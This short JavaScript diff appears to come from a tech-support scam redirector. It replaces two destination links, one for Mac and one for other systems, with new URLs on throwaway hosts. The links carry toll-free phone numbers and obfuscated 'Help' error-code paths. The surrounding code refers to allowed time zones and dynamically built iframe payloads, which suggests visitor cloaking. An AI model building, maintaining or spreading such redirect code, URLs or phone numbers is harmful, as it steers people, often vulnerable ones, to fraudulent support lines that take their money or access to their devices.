@@ -42,8 +42,8 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Destination Links
-const LINK_MAC = "https://whale-app-94bip.ondigitalocean.app/werrx01USAHTML/?bcda=1800 034 661&os=mac";
-const LINK_OTHERS = "https://whale-app-94bip.ondigitalocean.app/werrx01USAHTML/?bcda=1800 034 661&os=other";
+const LINK_MAC = "https://meenapyy333.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-844-590-5369";
+const LINK_OTHERS = "https://meenapyy333.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369";
 
 // --- Pre-Compilation Cache Layer ---
 // Helper to generate identical iframe payloads dynamically on boot
